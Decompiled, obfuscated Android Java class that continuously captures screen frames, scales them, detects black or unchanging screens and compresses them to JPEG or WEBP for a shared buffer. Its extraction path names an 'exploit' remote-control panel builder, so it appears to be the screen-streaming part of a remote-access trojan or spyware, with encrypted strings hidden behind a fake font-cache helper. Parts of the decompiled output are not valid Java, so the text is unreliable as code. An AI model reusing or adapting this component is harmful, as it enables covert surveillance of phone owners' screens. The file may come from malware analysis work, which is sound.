package v.s;

import android.graphics.Bitmap;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import app.mobilex.plus.services.ManagerUMController;
import app.mobilex.plus.services.UtilAIWorker;
import app.mobilex.plus.util.TypefaceCache;
import java.io.ByteArrayOutputStream;
import java.lang.ref.WeakReference;
import java.nio.ByteBuffer;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class pkLNH6NnynzgsXMXhe implements ImageReader.OnImageAvailableListener {
    public final ByteArrayOutputStream JXn4Qf7zpnLjP5 = new ByteArrayOutputStream(65536);
    public final WeakReference dDIMxZXP1V8HdM;
    public volatile int vekpFI4d1Nc4fakF;
    public volatile long w9sT1Swbhx3hs;

    public pkLNH6NnynzgsXMXhe(ManagerUMController managerUMController) {
        this.dDIMxZXP1V8HdM = new WeakReference(managerUMController);
    }

    /* JADX WARN: Multi-variable type inference failed */
    @Override // android.media.ImageReader.OnImageAvailableListener
    public final void onImageAvailable(ImageReader imageReader) {
        int i;
        int i2;
        float f;
        ManagerUMController managerUMController = (ManagerUMController) this.dDIMxZXP1V8HdM.get();
        if (managerUMController == null || imageReader == null) {
            return;
        }
        String str = ManagerUMController.DVTNwpDEVsUKuznof;
        if (!ManagerUMController.ECwLkmPW1UKz7J6E) {
            return;
        }
        try {
            if (ManagerUMController.MSGkxvPxRYNqC) {
                Image imageAcquireLatestImage = imageReader.acquireLatestImage();
                if (imageAcquireLatestImage != null) {
                    imageAcquireLatestImage.close();
                    return;
                }
                return;
            }
            long jCurrentTimeMillis = System.currentTimeMillis();
            int i3 = QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM;
            int iJ0zjQ7CAgohuxU20eCW6 = Y9mRyRdkl5FOcwb66V6.J0zjQ7CAgohuxU20eCW6(QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM);
            if (iJ0zjQ7CAgohuxU20eCW6 == 0) {
                i = 45 - 20;
            } else if (iJ0zjQ7CAgohuxU20eCW6 == 1) {
                i = 15;
            } else {
                if (iJ0zjQ7CAgohuxU20eCW6 != 2) {
                    throw new Sb7Xj3N9U1DQ();
                }
                i = (-43) + 51;
            }
            long j = 1000 / ((long) i);
            boolean z = UtilAIWorker.MLSIo1htfMPWeB8V876L;
            if (UtilAIWorker.MLSIo1htfMPWeB8V876L) {
                float f2 = j;
                int iJ0zjQ7CAgohuxU20eCW7 = Y9mRyRdkl5FOcwb66V6.J0zjQ7CAgohuxU20eCW6(QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM);
                if (iJ0zjQ7CAgohuxU20eCW7 == 0) {
                    f = 1.0f;
                } else if (iJ0zjQ7CAgohuxU20eCW7 == 1) {
                    f = 0.7f;
                } else {
                    if (iJ0zjQ7CAgohuxU20eCW7 != 2) {
                        throw new Sb7Xj3N9U1DQ();
                    }
                    f = 0.5f;
                }
                j = (long) (f2 / f);
            }
            if (jCurrentTimeMillis - this.w9sT1Swbhx3hs < j) {
                Image imageAcquireLatestImage2 = imageReader.acquireLatestImage();
                if (imageAcquireLatestImage2 != null) {
                    imageAcquireLatestImage2.close();
                    return;
                }
                return;
            }
            synchronized (managerUMController.gIIiyi2ddlMDR0) {
                if (imageReader != managerUMController.vekpFI4d1Nc4fakF || managerUMController.dDIMxZXP1V8HdM == null) {
                    try {
                        Image imageAcquireLatestImage3 = imageReader.acquireLatestImage();
                        if (imageAcquireLatestImage3 != null) {
                            imageAcquireLatestImage3.close();
                        }
                    } catch (Exception unused) {
                    }
                    return;
                }
                Image image = null;
                bitmapCreateScaledBitmap = null;
                bitmapCreateScaledBitmap = null;
                bitmapCreateScaledBitmap = null;
                Bitmap bitmapCreateScaledBitmap = null;
                Image image2 = null;
                Image image3 = null;
                try {
                    try {
                        Image imageAcquireLatestImage4 = imageReader.acquireLatestImage();
                        if (imageAcquireLatestImage4 == null) {
                            return;
                        }
                        try {
                            if (!ManagerUMController.ECwLkmPW1UKz7J6E) {
                                try {
                                    imageAcquireLatestImage4.close();
                                } catch (Exception unused2) {
                                }
                                return;
                            }
                            int width = imageAcquireLatestImage4.getWidth();
                            int height = imageAcquireLatestImage4.getHeight();
                            if (width >= 50 && height >= 50) {
                                float f3 = width / (height < 1 ? 1 : height);
                                if (f3 > 10.0f || f3 < 0.1f) {
                                    this.vekpFI4d1Nc4fakF++;
                                    if (this.vekpFI4d1Nc4fakF >= 3) {
                                        this.vekpFI4d1Nc4fakF = 0;
                                        Handler handler = managerUMController.gmNWMfvn6zlEj;
                                        if (handler == null) {
                                            handler = new Handler(Looper.getMainLooper());
                                        }
                                        handler.post(new l3twm5tDUAP2(managerUMController, 3));
                                    }
                                    try {
                                        imageAcquireLatestImage4.close();
                                    } catch (Exception unused3) {
                                    }
                                    return;
                                }
                                this.vekpFI4d1Nc4fakF = 0;
                                Image.Plane[] planes = imageAcquireLatestImage4.getPlanes();
                                if (planes != null && planes.length != 0) {
                                    ByteBuffer buffer = planes[0].getBuffer();
                                    int pixelStride = planes[0].getPixelStride();
                                    int rowStride = planes[0].getRowStride();
                                    if (pixelStride > 0 && rowStride > 0) {
                                        int iMax = (Math.max(0, rowStride - (pixelStride * width)) / pixelStride) + width;
                                        Bitmap bitmapCreateBitmap = Bitmap.createBitmap(iMax, height, Bitmap.Config.ARGB_8888);
                                        bitmapCreateBitmap.copyPixelsFromBuffer(buffer);
                                        if (iMax != width) {
                                            Bitmap bitmapCreateBitmap2 = Bitmap.createBitmap(bitmapCreateBitmap, 0, 0, width, height);
                                            bitmapCreateBitmap.recycle();
                                            bitmapCreateBitmap = bitmapCreateBitmap2;
                                        }
                                        try {
                                            imageAcquireLatestImage4.close();
                                        } catch (Exception unused4) {
                                        }
                                        if (bitmapCreateBitmap != null) {
                                            try {
                                                if (bitmapCreateBitmap.isRecycled()) {
                                                    return;
                                                }
                                                try {
                                                    String str2 = ManagerUMController.DVTNwpDEVsUKuznof;
                                                    int i4 = ManagerUMController.l1V0lQr6TbwNKqHfXNbb;
                                                    if (i4 < 120) {
                                                        i4 = 120;
                                                    }
                                                    int iW9sT1Swbhx3hs = QmLUFJ3vXstIdpO2wk.w9sT1Swbhx3hs();
                                                    if (i4 > iW9sT1Swbhx3hs) {
                                                        i4 = iW9sT1Swbhx3hs;
                                                    }
                                                    int i5 = width < 1 ? 1 : width;
                                                    int i6 = height < 1 ? 1 : height;
                                                    if (i5 <= i6) {
                                                        i2 = (int) ((i6 / i5) * i4);
                                                        if (i2 < i4) {
                                                            i2 = i4;
                                                        }
                                                    } else {
                                                        int i7 = (int) ((i5 / i6) * i4);
                                                        if (i7 < i4) {
                                                            i7 = i4;
                                                        }
                                                        int i8 = i7;
                                                        i2 = i4;
                                                        i4 = i8;
                                                    }
                                                    bitmapCreateScaledBitmap = (i4 == bitmapCreateBitmap.getWidth() && i2 == bitmapCreateBitmap.getHeight()) ? bitmapCreateBitmap : Bitmap.createScaledBitmap(bitmapCreateBitmap, i4, i2, false);
                                                    int pixel = bitmapCreateScaledBitmap.getPixel(bitmapCreateScaledBitmap.getWidth() / 2, bitmapCreateScaledBitmap.getHeight() / 2);
                                                    int i9 = (pixel >> 16) & 255;
                                                    int i10 = (pixel >> 8) & 255;
                                                    int i11 = pixel & 255;
                                                    if (i9 >= 5 || i10 >= 5 || i11 >= 5) {
                                                        ManagerUMController.dQC4QhgRN3MSEAP3HW0 = 0;
                                                    } else {
                                                        int pixel2 = bitmapCreateScaledBitmap.getPixel(bitmapCreateScaledBitmap.getWidth() / 4, bitmapCreateScaledBitmap.getHeight() / 4);
                                                        int pixel3 = bitmapCreateScaledBitmap.getPixel((bitmapCreateScaledBitmap.getWidth() * 3) / 4, (bitmapCreateScaledBitmap.getHeight() * 3) / 4);
                                                        if (((pixel2 >> 16) & 255) >= 5 || ((pixel2 >> 8) & 255) >= 5 || (pixel2 & 255) >= 5 || ((pixel3 >> 16) & 255) >= 5 || ((pixel3 >> 8) & 255) >= 5 || (pixel3 & 255) >= 5) {
                                                            ManagerUMController.dQC4QhgRN3MSEAP3HW0 = 0;
                                                        } else {
                                                            ManagerUMController.dQC4QhgRN3MSEAP3HW0++;
                                                        }
                                                    }
                                                    this.JXn4Qf7zpnLjP5.reset();
                                                    int i12 = ManagerUMController.XuO9PPFo607ssKwZjNW;
                                                    int iDDIMxZXP1V8HdM = QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM();
                                                    if (i12 > iDDIMxZXP1V8HdM) {
                                                        i12 = iDDIMxZXP1V8HdM;
                                                    }
                                                    if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(ManagerUMController.hV4VTKNUdeHN, TypefaceCache.obtain("00290066005E0080"))) {
                                                        bitmapCreateScaledBitmap.compress(Bitmap.CompressFormat.JPEG, i12, this.JXn4Qf7zpnLjP5);
                                                    } else {
                                                        if ((QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM == 3) == true) {
                                                            bitmapCreateScaledBitmap.compress(Bitmap.CompressFormat.JPEG, i12, this.JXn4Qf7zpnLjP5);
                                                        } else if (Build.VERSION.SDK_INT >= 30) {
                                                            bitmapCreateScaledBitmap.compress(Bitmap.CompressFormat.WEBP_LOSSY, i12, this.JXn4Qf7zpnLjP5);
                                                        } else {
                                                            bitmapCreateScaledBitmap.compress(Bitmap.CompressFormat.WEBP, i12, this.JXn4Qf7zpnLjP5);
                                                        }
                                                    }
                                                    byte[] byteArray = this.JXn4Qf7zpnLjP5.toByteArray();
                                                    int i13 = ManagerUMController.jdOQeRk37T35X5xKW1P;
                                                    float fAbs = i13 > 0 ? Math.abs(byteArray.length - i13) / ManagerUMController.jdOQeRk37T35X5xKW1P : 1.0f;
                                                    ManagerUMController.jdOQeRk37T35X5xKW1P = byteArray.length;
                                                    if (fAbs < 0.03f) {
                                                        int i14 = ManagerUMController.is7XW2V21HfKv7MihWy + 1;
                                                        ManagerUMController.is7XW2V21HfKv7MihWy = i14;
                                                        if (i14 >= 5) {
                                                            ManagerUMController.VEkRsTDS6a9oHWI = true;
                                                        }
                                                    } else {
                                                        ManagerUMController.is7XW2V21HfKv7MihWy = 0;
                                                        if (ManagerUMController.VEkRsTDS6a9oHWI) {
                                                            ManagerUMController.VEkRsTDS6a9oHWI = false;
                                                        }
                                                    }
                                                    ManagerUMController.euF5Udt5Rqv3Qmea = width;
                                                    ManagerUMController.qfTrc75xwRVMl85vh = height;
                                                    ManagerUMController.k84rwRrqzhrNQ1CdNQ9 = i4;
                                                    ManagerUMController.A1BaTVAMeIXMnh = i2;
                                                    ManagerUMController.iUQk66nAiXgO35.set(byteArray);
                                                    this.w9sT1Swbhx3hs = jCurrentTimeMillis;
                                                    if (bitmapCreateScaledBitmap != bitmapCreateBitmap && !bitmapCreateScaledBitmap.isRecycled()) {
                                                        bitmapCreateScaledBitmap.recycle();
                                                    }
                                                    if (bitmapCreateBitmap.isRecycled()) {
                                                        return;
                                                    }
                                                } catch (Exception e) {
                                                    String str3 = ManagerUMController.DVTNwpDEVsUKuznof;
                                                    TypefaceCache.obtain("00050064005A008A00F500FF00D700A900200079005F008200B000BA00C000B5002C0064000100C7");
                                                    e.getMessage();
                                                    if (bitmapCreateScaledBitmap != null && bitmapCreateScaledBitmap != bitmapCreateBitmap && !bitmapCreateScaledBitmap.isRecycled()) {
                                                        bitmapCreateScaledBitmap.recycle();
                                                    }
                                                    if (bitmapCreateBitmap.isRecycled()) {
                                                        return;
                                                    }
                                                } catch (OutOfMemoryError e2) {
                                                    String str4 = ManagerUMController.DVTNwpDEVsUKuznof;
                                                    TypefaceCache.obtain("000C0059007600C700F900B1009200A1003100770056008200B000BA00DC00A4002C0072005E00DD00B0");
                                                    e2.getMessage();
                                                    System.gc();
                                                    if (bitmapCreateScaledBitmap != null && bitmapCreateScaledBitmap != bitmapCreateBitmap && !bitmapCreateScaledBitmap.isRecycled()) {
                                                        bitmapCreateScaledBitmap.recycle();
                                                    }
                                                    if (bitmapCreateBitmap.isRecycled()) {
                                                        return;
                                                    }
                                                }
                                                bitmapCreateBitmap.recycle();
                                                return;
                                            } catch (Throwable th) {
                                                if (bitmapCreateScaledBitmap != null && bitmapCreateScaledBitmap != bitmapCreateBitmap && !bitmapCreateScaledBitmap.isRecycled()) {
                                                    bitmapCreateScaledBitmap.recycle();
                                                }
                                                if (!bitmapCreateBitmap.isRecycled()) {
                                                    bitmapCreateBitmap.recycle();
                                                }
                                                throw th;
                                            }
                                        }
                                        return;
                                    }
                                    try {
                                        imageAcquireLatestImage4.close();
                                    } catch (Exception unused5) {
                                    }
                                    return;
                                }
                                try {
                                    imageAcquireLatestImage4.close();
                                } catch (Exception unused6) {
                                }
                                return;
                            }
                            try {
                                imageAcquireLatestImage4.close();
                            } catch (Exception unused7) {
                            }
                        } catch (Exception e3) {
                            e = e3;
                            image3 = imageAcquireLatestImage4;
                            String str5 = ManagerUMController.DVTNwpDEVsUKuznof;
                            TypefaceCache.obtain("000A007B005A008000F500FF00D300A4003200630052009500F500FF00D700B500310079004900DD00B0");
                            e.getMessage();
                            if (image3 != null) {
                                try {
                                    image3.close();
                                } catch (Exception unused8) {
                                }
                            }
                        } catch (OutOfMemoryError e4) {
                            e = e4;
                            image = imageAcquireLatestImage4;
                            String str6 = ManagerUMController.DVTNwpDEVsUKuznof;
                            TypefaceCache.obtain("000C0059007600C700F100BC00C300B2002A00640052008900F700FF00DB00AA00220071005E00DD00B0");
                            e.getMessage();
                            System.gc();
                            if (image != null) {
                                try {
                                    image.close();
                                } catch (Exception unused9) {
                                }
                            }
                        } catch (Throwable th2) {
                            th = th2;
                            image2 = imageAcquireLatestImage4;
                            if (image2 != null) {
                                try {
                                    image2.close();
                                } catch (Exception unused10) {
                                }
                            }
                            throw th;
                        }
                    } catch (Throwable th3) {
                        th = th3;
                    }
                } catch (Exception e5) {
                    e = e5;
                } catch (OutOfMemoryError e6) {
                    e = e6;
                }
            }
        } catch (Exception unused11) {
        }
    }
}
